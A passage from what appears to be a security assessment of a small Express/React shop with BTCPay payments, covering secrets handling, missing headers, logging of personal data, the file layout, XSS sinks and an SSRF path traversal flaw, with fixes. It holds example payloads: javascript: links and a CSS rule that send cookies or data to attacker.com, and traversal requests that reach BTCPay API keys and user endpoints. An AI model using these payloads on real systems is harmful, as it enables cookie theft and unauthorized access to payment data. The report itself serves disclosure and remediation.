- ✅ Type checking (string, number, boolean, decimal)
- ✅ Required field enforcement (`.min(1)` prevents empty strings)
- ✅ Email format validation (`.email()`)
- ✅ Whitelist validation for enums (payment methods)
- ✅ Automatic error messages via `error.flatten()`

**Validation Weaknesses:**
- ❌ No HTML sanitization (allows stored XSS in blog content, product descriptions)
- ❌ No maximum length limits on text fields (potential DoS via large inputs)
- ❌ No URL scheme validation (allows `javascript:` protocol in uploaded file URLs)
- ❌ No filename sanitization in file uploads (path traversal risk)
- ❌ No MIME type validation beyond multer configuration

### Background Processing Security

The application has **no background job processing system**. All operations are synchronous request-response handlers. There are no:
- Worker queues (Bull, BeeQueue, etc.)
- Scheduled cron jobs
- Async task processors
- Webhook handlers for incoming events
- Long-running background tasks

The only asynchronous operations are:
- Database queries (awaited in request handlers)
- External BTCPay API calls (awaited with retry logic)
- Session store persistence (handled by express-session middleware)

All of these run within the context of HTTP requests with proper authentication and authorization checks applied.

---

## 6. Infrastructure & Operational Security

### Secrets Management

**Current Implementation:** All secrets are stored as **environment variables** with no vault integration or encryption.

**Secrets Identified:**

1. **Database Connection String** (`/repos/exo/server/db.ts:6`):
   ```typescript
   connectionString: process.env.DATABASE_URL
   ```
   - Contains database host, port, username, password, database name
   - Exposed in process memory throughout application lifecycle
   - No connection string encryption

2. **Session Secret** (`/repos/exo/server/index.ts:35`):
   ```typescript
   secret: process.env.SESSION_SECRET || "dev-secret-change-me"
   ```
   - Used for HMAC signing of session cookies
   - Weak default fallback value
   - Compromise allows session forgery and authentication bypass

3. **Admin Credentials** (`/repos/exo/server/routes.ts:30-31`):
   ```typescript
   const ADMIN_USERNAME = process.env.ADMIN_USERNAME;
   const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;
   ```
   - Stored in plaintext as environment variables
   - No hashing or encryption
   - Warning logged if not set (line 33)

4. **BTCPay Server API Credentials** (`/repos/exo/server/routes.ts:13-16`):
   ```typescript
   const BTCPAY_URL = process.env.BTCPAY_URL;
   const BTCPAY_API_KEY = process.env.BTCPAY_API_KEY;
   const BTCPAY_STORE_ID = process.env.BTCPAY_STORE_ID;
   const BTCPAY_PROXY_KEY = process.env.BTCPAY_PROXY_KEY;
   ```
   - Payment processor API authentication token
   - If leaked, allows unauthorized invoice creation and payment manipulation

**Security Deficiencies:**
- ❌ No secrets vault (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, GCP Secret Manager)
- ❌ No secret rotation mechanisms
- ❌ No secret versioning
- ❌ No access logging for secret retrieval
- ❌ No encryption of secrets at rest (relies on OS file permissions for .env files)
- ❌ No least-privilege secret access (all secrets available to application process)

### Configuration Security

**Environment Separation:**

The application uses `NODE_ENV` environment variable to differentiate between development and production modes:

- **Development Mode** (`NODE_ENV !== "production"`):
  - Vite dev server enabled at `/repos/exo/server/vite.ts`
  - HMR (Hot Module Replacement) endpoint at `/vite-hmr`
  - Source maps enabled
  - Transformed HTML served with injected Vite scripts

- **Production Mode** (`NODE_ENV === "production"`):
  - Static file serving from `dist/public` directory at `/repos/exo/server/static.ts`
  - Pre-built and optimized assets
  - No source maps (security improvement)

**Configuration File Analysis:**

- **Server Configuration:** `/repos/exo/server/index.ts`
  - Port: `process.env.PORT || 5000`
  - Host: `0.0.0.0` (binds to all interfaces - security risk in some environments)
  - Trust proxy: Enabled (`app.set("trust proxy", 1)` at line 9) - trusts X-Forwarded headers

- **Build Configuration:** `/repos/exo/vite.config.ts`
  - Output directory: `dist/public`
  - Server port: 5000
  - No security-relevant CSP or headers configuration

- **Database Configuration:** `/repos/exo/drizzle.config.ts`
  - Connection: `process.env.DATABASE_URL`
  - Schema: `./shared/schema.ts`
  - Migrations: `./migrations` directory

**Configuration Security Issues:**
- ⚠️ **Trust Proxy Enabled** - If not behind a proper reverse proxy, attackers can spoof IP addresses via X-Forwarded headers
- ❌ **No Environment Variable Validation** - Application doesn't validate required env vars at startup (except admin credentials warning)
- ❌ **No Configuration Encryption** - All config in plaintext
- ❌ **Bind to 0.0.0.0** - Exposes service on all network interfaces

### Security Headers Configuration

**Status:** ❌ **CRITICALLY MISSING** - No security headers implemented.

**Infrastructure-Level Header Search:**

Searched for Nginx, Apache, Kubernetes Ingress, and CDN configurations that might define security headers. **No infrastructure configuration files found** in the repository.

**Application-Level Header Search:**

No security header middleware found in the Express.js application. The application does not use:
- **helmet** package for automatic security headers
- Manual header setting via `res.setHeader()`

**Missing Critical Headers:**

1. **Content-Security-Policy (CSP):** ❌ Not configured
   - Allows inline scripts and styles (XSS risk)
   - No restrictions on resource loading
   - No reporting endpoint for violations

2. **Strict-Transport-Security (HSTS):** ❌ Not configured
   - No HTTPS enforcement
   - Vulnerable to protocol downgrade attacks
   - No HSTS preload

3. **X-Frame-Options:** ❌ Not configured
   - Allows application to be embedded in iframes
   - Vulnerable to clickjacking attacks

4. **X-Content-Type-Options:** ❌ Not configured
   - Allows MIME type sniffing
   - Browser may execute files as different types than intended

5. **Referrer-Policy:** ❌ Not configured
   - Full referrer URL leaked to external sites
   - May expose sensitive information in URL parameters

6. **Permissions-Policy:** ❌ Not configured
   - All browser features enabled (camera, microphone, geolocation, etc.)
   - No feature restrictions

7. **Cache-Control:** ❌ Not explicitly configured
   - Sensitive data may be cached by browsers or proxies
   - No cache directives for private data

**Rate Limit Headers (Implemented):**

The only headers set are rate limit response headers via `express-rate-limit`:
- `RateLimit-Limit` - Request limit (100, 10, or 30 depending on tier)
- `RateLimit-Remaining` - Remaining requests in window
- `RateLimit-Reset` - Timestamp when limit resets
- Configured at `/repos/exo/server/routes.ts:48,56,64` with `standardHeaders: true`

### External Dependencies & Supply Chain Security

**Package Management:** npm with dependencies defined in `/repos/exo/package.json`

**Critical External Services:**

1. **BTCPay Server** (Cryptocurrency Payment Processor):
   - **Base URL:** `process.env.BTCPAY_URL` (operator-controlled)
   - **Authentication:** Bearer token via `BTCPAY_API_KEY`
   - **API Endpoints Called:**
     - `POST /api/v1/stores/${STORE_ID}/invoices` - Create payment invoice
     - `GET /api/v1/stores/${STORE_ID}/invoices/${INVOICE_ID}` - Get invoice status
     - `GET /api/v1/stores/${STORE_ID}/invoices/${INVOICE_ID}/payment-methods` - Get payment methods
   - **Security Controls:**
     - HTTPS transport (application uses `https://` in BTCPay_URL)
     - API key authentication
     - Retry logic with exponential backoff (3 attempts)
     - Optional proxy key support
   - **Security Risks:**
     - SSRF vulnerability allows abuse of these credentials
     - No validation of BTCPay response integrity
     - No webhook signature verification (webhooks not implemented)

2. **Neon Database** (Serverless PostgreSQL):
   - **Connection:** Via `@neondatabase/serverless` driver
   - **Connection String:** Stored in `DATABASE_URL` environment variable
   - **Security:** Relies on TLS connection to Neon infrastructure
   - **Risk:** No application-layer encryption, complete trust in Neon's security

**Third-Party Frontend Libraries (Security-Relevant):**

- **React 18.3.1** - Maintained framework, no known critical vulnerabilities
- **TanStack Query** - State management, handles API requests with credentials
- **Radix UI** - Unstyled component library, 20+ primitives
- **Zod 3.24.1** - Validation library, critical for input sanitization
- **Wouter** - Lightweight routing library (1.5KB)

**Backend Dependencies (Security-Relevant):**

- **express 5.0.1** - Latest major version, modern security features
- **express-session 1.18.1** - Session management
- **connect-pg-simple 11.0.0** - PostgreSQL session store
- **express-rate-limit 7.5.0** - Rate limiting middleware
- **multer 1.4.5-lts.1** - File upload handling
- **drizzle-orm 0.39.2** - ORM with parameterized queries (SQL injection protection)

**Supply Chain Security Gaps:**
- ❌ No dependency vulnerability scanning in CI/CD
- ❌ No lock file integrity verification
- ❌ No supply chain attack detection (no npm audit in deployment)
- ❌ No pinned dependency versions (uses `^` ranges in package.json)
- ❌ No private package registry or proxy

### Monitoring & Logging

**Current Logging Implementation:** Basic console logging at `/repos/exo/server/index.ts:58-82`

**What Is Logged:**

```typescript
app.use((req, res, next) => {
  const start = Date.now();
  const path = req.path;
  let capturedJsonResponse: Record<string, any> | undefined = undefined;

  const originalResJson = res.json;
  res.json = function (bodyJson, ...args) {
    capturedJsonResponse = bodyJson;
    return originalResJson.apply(res, [bodyJson, ...args]);
  };

  res.on("finish", () => {
    const duration = Date.now() - start;
    if (path.startsWith("/api")) {
      let logLine = `${req.method} ${path} ${res.statusCode} in ${duration}ms`;
      if (capturedJsonResponse) {
        logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;
      }
      log(logLine);
    }
  });
  next();
});
```

**Logged Information:**
- HTTP method (GET, POST, PATCH, DELETE)
- Request path
- Response status code
- Request duration in milliseconds
- **FULL API RESPONSE BODY** (line 74) - includes PII, passwords, sensitive data

**Timestamp Format** (lines 48-53):
```typescript
function log(message: string) {
  const timestamp = new Date().toISOString().replace("T", " ").split(".")[0];
  console.log(`[${timestamp}] ${message}`);
}
```

**Critical Logging Vulnerabilities:**

1. **PII in Logs** - Shipping addresses, emails, names logged in order API responses
2. **Password Exposure** - Login responses, blog post data may contain passwords
3. **Payment Data** - Invoice details, payment amounts logged
4. **No Log Sanitization** - Sensitive fields not redacted
5. **No Log Rotation** - Logs grow indefinitely
6. **No Log Aggregation** - Only console output, no centralized logging (Elasticsearch, Splunk, CloudWatch)
7. **No Structured Logging** - Plain text format, difficult to parse/analyze
8. **No Correlation IDs** - Cannot trace requests through system

**Security Event Logging Status:**

❌ **Not Implemented** - No logging for:
- Authentication attempts (successful/failed logins)
- Authorization failures (401/403 responses)
- Admin privilege usage
- Data access (who accessed which orders/results)
- Configuration changes
- File uploads
- Password reset attempts
- Session creation/destruction
- Suspicious activity (rapid requests, unusual patterns)

**Monitoring & Alerting:**

❌ **Not Implemented** - No monitoring for:
- Abnormal traffic patterns
- Failed authentication attempts
- Privilege escalation attempts
- Data exfiltration indicators
- Resource exhaustion
- Error rate spikes
- Performance degradation

**Application Performance Monitoring (APM):**
- ❌ No APM integration (New Relic, DataDog, Sentry)
- ❌ No error tracking
- ❌ No performance metrics
- ❌ No uptime monitoring

---

## 7. Overall Codebase Indexing

The codebase follows a **TypeScript monorepo structure** with clear separation between client-side, server-side, and shared code. The organization facilitates security review by maintaining distinct boundaries between frontend presentation logic, backend business logic, and common validation schemas.

### Directory Structure and Organization

**Root Structure:**
```
/repos/exo/
├── client/          # React frontend SPA
├── server/          # Express.js backend
├── shared/          # Shared TypeScript schemas and types
├── migrations/      # Database migration files (Drizzle)
├── dist/            # Production build output
└── (config files)   # vite.config.ts, drizzle.config.ts, package.json, tsconfig.json
```

The **client/** directory (`/repos/exo/client/`) contains the React single-page application with the following key subdirectories:

- **src/pages/** - Page components representing routes (admin.tsx, checkout.tsx, post-detail.tsx, result-detail.tsx, terms.tsx, etc.)
  - Security relevance: These components make API requests and render user data, potential XSS sinks
  - The admin.tsx file is particularly critical (1873 lines) containing all admin panel functionality

- **src/components/** - Reusable UI components organized by function:
  - **components/ui/** - Radix UI primitive wrappers (button, dialog, form, input, table, chart, etc.)
  - Security relevance: Chart component contains `dangerouslySetInnerHTML` usage at line 81

- **src/lib/** - Utility libraries:
  - **queryClient.ts** - Centralized API request handler with `credentials: "include"`
  - **utils.ts** - Helper functions (className merging, etc.)

- **src/hooks/** - Custom React hooks (useIsMobile.tsx)

The **server/** directory (`/repos/exo/server/`) contains backend logic with a flat structure optimized for a monolithic architecture:

- **index.ts** (152 lines) - Main application entry point:
  - Express app initialization
  - Session middleware configuration
  - Request logging middleware
  - Server startup on port 5000
  - Security relevance: Session cookie configuration, trust proxy settings, full response logging

- **routes.ts** (691 lines) - **MOST CRITICAL FILE FOR SECURITY REVIEW**:
  - All API route definitions (42 total endpoints)
  - Authentication and authorization logic
  - Input validation with Zod schemas
  - External BTCPay API integration
  - File upload handlers
  - Rate limiting configuration
  - Security relevance: Contains all authentication logic, SSRF vulnerability, file upload vulnerabilities

- **storage.ts** - Database abstraction layer:
  - CRUD operations for all entities
  - Uses Drizzle ORM for query building
  - Security relevance: Parameterized queries prevent SQL injection

- **db.ts** - Database connection configuration:
  - Neon serverless PostgreSQL driver setup
  - Drizzle ORM initialization
  - Security relevance: Connection string from environment variables

- **vite.ts** - Development server integration:
  - Vite middleware for HMR in development mode
  - Serves transformed index.html with Vite scripts
  - Only loaded when NODE_ENV !== "production"

- **static.ts** - Production static file serving:
  - Serves pre-built assets from dist/public
  - SPA fallback to index.html for client-side routing
  - Only loaded when NODE_ENV === "production"

The **shared/** directory (`/repos/exo/shared/`) contains type definitions and validation schemas:

- **schema.ts** (151 lines) - **CRITICAL FOR SECURITY REVIEW**:
  - Drizzle ORM table schemas (8 tables)
  - Zod validation schemas for API inputs
  - Security relevance: Password storage as plaintext `text` type, PII field definitions, validation rules

### Build Orchestration and Development Tools

**Build System:** Vite 7.3.0 configured in `/repos/exo/vite.config.ts`
- Development mode: Dev server with HMR integrated into Express app
- Production mode: Optimized build to `dist/public` with code splitting
- TypeScript compilation: `tsc` via `tsconfig.json` with strict mode enabled
- Build command: `npm run build` (runs TypeScript check + Vite build)

**Database Migration System:** Drizzle Kit configured in `/repos/exo/drizzle.config.ts`
- Schema file: `./shared/schema.ts`
- Migration directory: `./migrations`
- Driver: Neon serverless PostgreSQL
- Commands: `npm run db:push` (apply schema), `npm run db:studio` (GUI)
- Security relevance: Migrations may contain DDL that creates insecure schema structures

**Package Management:** npm with lock file (`package-lock.json`)
- Dependencies defined in `/repos/exo/package.json`
- Scripts: dev, build, start, db:push, db:studio
- No automated security scanning (npm audit) in CI/CD

**TypeScript Configuration:** `/repos/exo/tsconfig.json`
- Strict mode enabled (good for security)
- Target: ES2020
- Module: ESNext
- Paths alias: `@/*` maps to `./client/src/*`
- Security relevance: Type safety helps prevent certain bug classes

### Code Organization Patterns Affecting Security

**Centralized Validation:** All input validation schemas are defined in a single file (`shared/schema.ts`), making it easy to audit validation rules but creating a single point of failure if schemas are incomplete.

**Monolithic Route Handler:** The 691-line `routes.ts` file contains all API endpoints, authentication logic, and business logic, making comprehensive security review possible in one location but also creating a large attack surface in a single file.

**Shared Code Between Client/Server:** The `shared/` directory enables type safety across the stack but also means validation schemas are visible to the client, potentially exposing business logic to attackers.

**No Security Layer Separation:** Authentication, authorization, input validation, and business logic are intermingled in route handlers rather than separated into distinct middleware layers, making it harder to enforce consistent security policies.

**Environment-Based Configuration:** Extensive use of `process.env` for configuration provides flexibility but creates security risks if environment variables are not properly validated or if defaults are insecure.

### Discoverability Challenges for Security Components

**Positive Aspects:**
- Flat server structure makes finding route definitions trivial
- Centralized schema file enables quick validation rule review
- Clear naming conventions (admin endpoints prefixed with `/api/admin/`)
- Small codebase size (~3000 lines total) enables thorough manual review

**Negative Aspects:**
- No clear security middleware directory or convention
- Session configuration buried in index.ts alongside logging
- Rate limiting configuration embedded in routes.ts
- No dedicated security documentation or README
- Environment variable dependencies not documented in one place

### Testing Framework Status

**Testing Infrastructure:** ❌ **NOT IMPLEMENTED**

The repository contains no test files, test frameworks, or testing configuration:
- No `__tests__/` directories
- No `.test.ts` or `.spec.ts` files
- No Jest, Vitest, Mocha, or other test framework configuration
- No end-to-end tests (Playwright, Cypress)
- No security-specific tests (authentication bypass attempts, injection tests)

This absence of tests means:
- No automated security regression testing
- No validation that security controls work as intended
- Changes to authentication/authorization logic cannot be verified automatically
- No test coverage for input validation edge cases

---

## 8. Critical File Paths

The following files have been identified as security-critical and should be prioritized for manual code review in subsequent penetration testing phases:

### Configuration Files

- **`/repos/exo/server/index.ts`** - Server initialization, session configuration (lines 28-45), cookie security flags (line 41), trust proxy setting (line 9), request logging with PII exposure (lines 58-82)
- **`/repos/exo/server/db.ts`** - Database connection configuration, connection string from environment variable (line 6)
- **`/repos/exo/drizzle.config.ts`** - Database migration configuration
- **`/repos/exo/vite.config.ts`** - Build configuration
- **`/repos/exo/package.json`** - Dependency manifest, npm scripts

### Authentication & Authorization

- **`/repos/exo/server/routes.ts`** (Lines 30-41, 124-145) - Admin authentication logic with plaintext password comparison, session management, requireAdmin middleware
- **`/repos/exo/server/index.ts`** (Lines 28-45) - Session cookie configuration with `secure: false` flag
- **`/repos/exo/shared/schema.ts`** (Lines 6-10) - Users table schema with plaintext password field
- **`/repos/exo/shared/schema.ts`** (Lines 25-34) - Blog posts table with plaintext lockPassword field (line 32)
- **`/repos/exo/client/src/pages/admin.tsx`** - Admin panel implementation, login form (lines 11-64), authentication check (lines 1747-1749)
- **`/repos/exo/client/src/lib/queryClient.ts`** - API request wrapper with `credentials: "include"` (line 19)

### API & Routing

- **`/repos/exo/server/routes.ts`** (Entire file, 691 lines) - **MOST CRITICAL FILE**: All API endpoint definitions, rate limiting, input validation, external API integration
  - Public endpoints: Lines 75-687
  - Admin endpoints: Lines 124-445
  - Checkout/payment: Lines 478-633
  - SSRF vulnerability: Lines 635-687
  - File uploads: Lines 268-295
  - Path traversal vulnerability: Lines 297-328

### Data Models & Database Interaction

- **`/repos/exo/shared/schema.ts`** (Entire file, 151 lines) - **CRITICAL**: All database table definitions and Zod validation schemas
  - Users table: Lines 6-10
  - Products table: Lines 12-23
  - Blog posts table: Lines 25-34
  - Orders table (PII storage): Lines 36-47
  - Site pages table: Lines 72-77
  - Test results table (PII): Lines 86-99
  - Coupons table: Lines 106-120
  - Validation schemas: Lines 54-146
- **`/repos/exo/server/storage.ts`** - Database abstraction layer, CRUD operations using Drizzle ORM
- **`/repos/exo/server/db.ts`** - Drizzle ORM configuration and database connection

### Dependency Manifests

- **`/repos/exo/package.json`** - NPM dependencies including security-relevant packages (express-session, express-rate-limit, multer, drizzle-orm, zod)
- **`/repos/exo/package-lock.json`** - Locked dependency versions for supply chain verification

### Sensitive Data & Secrets Handling

- **`/repos/exo/server/routes.ts`** (Lines 13-16, 30-31) - Environment variable usage for secrets (BTCPay credentials, admin credentials)
- **`/repos/exo/server/index.ts`** (Line 35) - Session secret with insecure default fallback
- **`/repos/exo/server/db.ts`** (Line 6) - Database URL from environment variable
- **`/repos/exo/shared/schema.ts`** (Lines 36-47) - Orders table storing PII in JSON text fields (shippingInfo, serviceInfo)
- **`/repos/exo/shared/schema.ts`** (Lines 86-99) - Test results table storing client names and results

### Middleware & Input Validation

- **`/repos/exo/server/routes.ts`** (Lines 36-41) - `requireAdmin` authorization middleware
- **`/repos/exo/server/routes.ts`** (Lines 45-67) - Rate limiting configuration (general, strict, moderate limiters)
- **`/repos/exo/server/routes.ts`** (Lines 6-11) - Multer file upload configuration (10MB limit, memory storage)
- **`/repos/exo/shared/schema.ts`** (Lines 54-146) - Zod validation schemas for all API inputs

### Logging & Monitoring

- **`/repos/exo/server/index.ts`** (Lines 48-82) - Request logging middleware with full response body logging (PII exposure at line 74)

### Infrastructure & Deployment

- **No infrastructure configuration files found** - No Nginx, Apache, Kubernetes, Docker Compose, or CDN configurations in repository
- **`/repos/exo/server/index.ts`** (Lines 141-150) - HTTP server configuration (port 5000, host 0.0.0.0, no TLS)

### Client-Side Security-Relevant Files

- **`/repos/exo/client/src/pages/result-detail.tsx`** (Lines 39-40, 91-97, 108-118) - XSS vulnerabilities: Renders admin-uploaded URLs in href/src attributes without validation
- **`/repos/exo/client/src/pages/checkout.tsx`** (Lines 326-332) - Open redirect via external payment link
- **`/repos/exo/client/src/components/ui/chart.tsx`** (Lines 81-98) - `dangerouslySetInnerHTML` usage for CSS injection (currently unused)
- **`/repos/exo/client/src/pages/admin.tsx`** (1873 lines) - Complete admin panel implementation with PII display, file uploads, content management

---

## 9. XSS Sinks and Render Contexts

This section catalogs all locations in the network-accessible codebase where user-controllable data could be rendered in a browser context, enabling Cross-Site Scripting (XSS) attacks. **Focus is exclusively on components accessible via the deployed web application's HTTP endpoints.**

### CONFIRMED XSS VULNERABILITIES

#### XSS-001: JavaScript Protocol Injection via Admin-Uploaded Chromatogram URLs

**Severity:** MEDIUM (Admin-controlled data on public endpoint)
**Location:** `/repos/exo/client/src/pages/result-detail.tsx:91-97`
**Render Context:** HTML href and src attributes
**Network Accessibility:** ✅ Public endpoint `/results/:uid` (no authentication required)

**Vulnerable Code:**
```typescript
{chromatograms.map((url, i) => (
  <a key={i} href={url} target="_blank" rel="noopener noreferrer">
    <img
      src={url}
      alt={`chromatogram ${i + 1}`}
      className="w-full rounded-md border border-dotted border-border"
    />
  </a>
))}
```

**Data Flow:**
1. Admin uploads files via `/api/admin/upload` (POST, requires authentication)
2. Files converted to base64 data URIs and stored in `test_results.chromatograms` field (JSON array)
3. Admin creates test result associating chromatogram URLs with result UID
4. Public user visits `/results/:uid` (GET, no authentication)
5. Frontend fetches result from `/api/results/:uid` (GET, public)
6. Data parsed: `JSON.parse(result.chromatograms || "[]")` at line 39
7. URLs rendered in `<a href={url}>` and `<img src={url}>` without validation

**Attack Scenario:**
An admin with compromised credentials or malicious intent creates a test result with:
```json
{
  "chromatograms": ["javascript:alert(document.cookie)"]
}
```

When a public user visits the result page and clicks the link:
- Browser executes JavaScript in the context of the application's origin
- Attacker gains access to session cookies (mitigated by `httpOnly: true`)
- Attacker can perform actions as the victim user
- Potential for credential theft via phishing payloads

**Exploitability:** MEDIUM
- Requires admin access to inject malicious payload
- Affects public users without authentication
- `rel="noopener noreferrer"` provides some protection but doesn't prevent JavaScript execution
- Modern browsers may block `javascript:` in some contexts but not reliably

**Recommended Mitigation:**
```typescript
// Validate URL scheme before rendering
const safeUrl = url.startsWith('data:image/') || url.startsWith('https://')
  ? url
  : '#';
<a href={safeUrl}>
```

---

#### XSS-002: JavaScript Protocol Injection via Admin-Uploaded Raw Data File URLs

**Severity:** MEDIUM (Admin-controlled data on public endpoint)
**Location:** `/repos/exo/client/src/pages/result-detail.tsx:108-118`
**Render Context:** HTML href attribute with download attribute
**Network Accessibility:** ✅ Public endpoint `/results/:uid`

**Vulnerable Code:**
```typescript
{rawDataFiles.map((file, i) => (
  <a
    key={i}
    href={file.data}
    download={file.name}
    className="flex items-center gap-2 px-3 py-2 bg-muted rounded-md hover:bg-accent transition-colors"
  >
    <Download className="w-4 h-4" />
    <span className="text-sm font-medium">{file.name}</span>
  </a>
))}
```

**Data Flow:**
1. Admin uploads files via `/api/admin/upload-files` (POST, authentication required)
2. Files stored as `{ name: string, data: string }` objects in `test_results.rawDataFiles` field
3. Data parsed: `JSON.parse(result.rawDataFiles || "[]")` at line 40
4. Both `file.data` (href) and `file.name` (download attribute and text content) rendered without validation

**Attack Scenarios:**

**Scenario 1: JavaScript Protocol in href**
```json
{
  "rawDataFiles": [
    {
      "name": "report.pdf",
      "data": "javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)"
    }
  ]
}
```

**Scenario 2: HTML Injection in filename**
```json
{
  "rawDataFiles": [
    {
      "name": "<img src=x onerror=alert(1)>",
      "data": "data:text/plain,test"
    }
  ]
}
```

**Note:** React's default escaping protects against Scenario 2, but the `download` attribute does **not** prevent JavaScript execution in the `href` attribute.

**Exploitability:** MEDIUM
**Recommended Mitigation:**
```typescript
const safeUrl = file.data.startsWith('data:') ? file.data : '#';
const safeName = file.name.replace(/[<>\"\']/g, ''); // Sanitize filename
<a href={safeUrl} download={safeName}>
```

---

#### XSS-003: CSS Injection via dangerouslySetInnerHTML in Chart Component

**Severity:** LOW (Component currently unused, controlled data)
**Location:** `/repos/exo/client/src/components/ui/chart.tsx:81-98`
**Render Context:** CSS within `<style>` tag
**Network Accessibility:** ❌ Component not used in any network-accessible pages

**Vulnerable Code:**
```typescript
<style
  dangerouslySetInnerHTML={{
    __html: Object.entries(THEMES)
      .map(
        ([theme, prefix]) => `
${prefix} [data-chart=${id}] {
${colorConfig
  .map(([key, itemConfig]) => {
    const color =
      itemConfig.theme?.[theme as keyof typeof itemConfig.theme] ||
      itemConfig.color
    return color ? `  --color-${key}: ${color};` : null
  })
  .join("\n")}
}
`
      )
      .join("\n"),
  }}
/>
```

**Data Sources:**
- `THEMES` - Hardcoded constant in same file (lines 34-37)
- `id` - Generated by `React.useId()` (cryptographically secure)
- `config` - Passed as component prop (developer-controlled chart configuration)

**Exploitability:** LOW
- Component not imported or used in any pages (verified via search)
- If used in future with user-controlled `config.color` values, could enable CSS injection
- Example malicious payload: `color: "red; } body { background: url(https://attacker.com/exfil?data=SECRET)"`

**Recommended Action:** Remove unused component or add strict color validation if implemented

---

### SAFE RENDERING PATTERNS IDENTIFIED

The following components were analyzed and confirmed **NOT vulnerable** to XSS due to React's default escaping:

#### Blog Post Content Rendering
**Location:** `/repos/exo/client/src/pages/post-detail.tsx:135-139`
```typescript
<div className="prose prose-invert prose-amber max-w-none">
  {content ? (
    <div className="whitespace-pre-wrap text-sm leading-relaxed tracking-wide">
      {content}
    </div>
  ) : (
```

**Security:** ✅ SAFE - React automatically escapes `{content}` text nodes
**Improvement Needed:** Should use markdown parser with sanitization for rich text

#### Site Page Content Rendering
**Location:** `/repos/exo/client/src/pages/terms.tsx:39-42`
```typescript
<div className="prose prose-invert prose-amber max-w-none">
  <div className="whitespace-pre-wrap text-sm leading-relaxed">
    {content}
  </div>
</div>
```

**Security:** ✅ SAFE - React escaping protects text rendering

#### Product Images and Descriptions
**Locations:** Multiple product display components
**Security:** ✅ SAFE - Base64 data URIs from database are rendered in `src` attributes, React escapes text descriptions

---

### XSS ATTACK SURFACE SUMMARY

**Total XSS Sinks Found:** 3
**Network-Accessible Vulnerabilities:** 2 (XSS-001, XSS-002)
**Publicly Accessible Without Auth:** 2 (both on `/results/:uid` endpoint)
**Admin-Only Attack Surface:** 1 (XSS-003, currently unused)

**Risk Assessment:**
- **Immediate Risk:** Medium - Requires admin compromise but affects public users
- **Impact:** Session hijacking (mitigated by httpOnly cookies), phishing, malware distribution
- **Likelihood:** Low - Requires admin access to inject payloads
- **Overall Risk:** MEDIUM

**Remediation Priority:**
1. **High Priority:** Validate URL schemes in result-detail.tsx (XSS-001, XSS-002)
2. **Medium Priority:** Implement Content Security Policy to block inline JavaScript
3. **Low Priority:** Remove unused chart component or add validation (XSS-003)

---

## 10. SSRF Sinks

This section identifies all locations where user-controlled input could influence server-side HTTP requests, potentially enabling Server-Side Request Forgery (SSRF) attacks to access internal resources or abuse the application's network position.

### CONFIRMED SSRF VULNERABILITY

#### SSRF-001: Path Traversal in BTCPay Invoice Retrieval Endpoint

**Severity:** HIGH
**Location:** `/repos/exo/server/routes.ts:635-687`
**SSRF Sink Type:** HTTP Client with User-Controllable URL Component
**Network Accessibility:** ✅ Public endpoint `/api/invoice/:invoiceId`
**Authentication Required:** ❌ No authentication

**Vulnerable Code:**
```typescript
app.get("/api/invoice/:invoiceId", moderateLimiter, async (req, res) => {
  try {
    if (!BTCPAY_URL || !BTCPAY_API_KEY || !BTCPAY_STORE_ID) {
      return res.status(503).json({ message: "Payment system not configured" });
    }

    const headers: Record<string, string> = {
      "Authorization": `token ${BTCPAY_API_KEY}`,
      "User-Agent": "SupplementsShop/1.0",
    };
    if (BTCPAY_PROXY_KEY) {
      headers["X-Api-Key"] = BTCPAY_PROXY_KEY;
    }

    const [invoiceRes, methodsRes] = await Promise.all([
      fetchWithRetry(`${BTCPAY_URL}/api/v1/stores/${BTCPAY_STORE_ID}/invoices/${req.params.invoiceId}`, { headers }),
      fetchWithRetry(`${BTCPAY_URL}/api/v1/stores/${BTCPAY_STORE_ID}/invoices/${req.params.invoiceId}/payment-methods`, { headers }),
    ]);
```

**User-Controllable Parameter:**
- `req.params.invoiceId` - Extracted from URL path, **NO VALIDATION APPLIED**

**Vulnerability Details:**

1. **Direct String Concatenation:** The `invoiceId` parameter is concatenated directly into URL strings (lines 650-651) without sanitization or encoding

2. **Path Traversal Attack:** Attacker can inject path traversal sequences to access arbitrary API endpoints:
   ```
   GET /api/invoice/../../api/v1/users

   Server constructs:
   ${BTCPAY_URL}/api/v1/stores/${BTCPAY_STORE_ID}/invoices/../../api/v1/users

   Which resolves to:
   ${BTCPAY_URL}/api/v1/users
   ```

3. **Credential Abuse:** Requests use the application's `BTCPAY_API_KEY` and optional `BTCPAY_PROXY_KEY`, allowing attackers to abuse the application's payment processor privileges

**Attack Scenarios:**

**Scenario 1: Internal API Enumeration**
```bash
# Attacker probes BTCPay Server API structure
GET /api/invoice/../../../server/info
GET /api/invoice/../../../api-keys
GET /api/invoice/../../../users
```

**Scenario 2: Unauthorized Data Access**
```bash
# Access store information
GET /api/invoice/../../..
# List all stores
GET /api/invoice/../../../stores
# Access other store's invoices
GET /api/invoice/../../../stores/OTHER-STORE-ID/invoices
```

**Scenario 3: Information Disclosure via Error Messages**
```bash
# Trigger errors that reveal internal structure
GET /api/invoice/INVALID/../../../
# Response may leak API paths, version info, internal IPs
```

**Impact Assessment:**

- **Confidentiality:** HIGH - Access to payment data, store configuration, user information
- **Integrity:** MEDIUM - Depending on BTCPay permissions, may be able to modify data
- **Availability:** LOW - Could cause DoS via expensive API calls
- **Compliance:** HIGH - Unauthorized access to payment processor violates PCI DSS (if applicable)

**Rate Limiting Protection:**
- Moderate limiter: 30 requests per 15 minutes per IP
- Provides minimal protection - allows 30 reconnaissance attempts
- Easily bypassed with distributed attack or IP rotation

**Recommended Mitigations:**

1. **Input Validation (Critical):**
   ```typescript
   // Whitelist allowed characters in invoice ID
   const invoiceIdPattern = /^[a-zA-Z0-9_-]{1,100}$/;
   if (!invoiceIdPattern.test(req.params.invoiceId)) {
     return res.status(400).json({ message: "Invalid invoice ID format" });
   }
   ```

2. **URL Encoding:**
   ```typescript
   const safeInvoiceId = encodeURIComponent(req.params.invoiceId);
   ```

3. **Database Verification:**
   ```typescript
   // Only allow invoices created by this application
   const order = await storage.getOrderByInvoiceId(req.params.invoiceId);
   if (!order) {
     return res.status(404).json({ message: "Invoice not found" });
   }
   ```

4. **Response Validation:**
   ```typescript
   // Verify response contains expected invoice structure
   if (!invoiceRes.ok || !invoiceData.id) {
     return res.status(500).json({ message: "Failed to retrieve invoice" });
   }
   ```

---

### SAFE EXTERNAL REQUEST PATTERNS

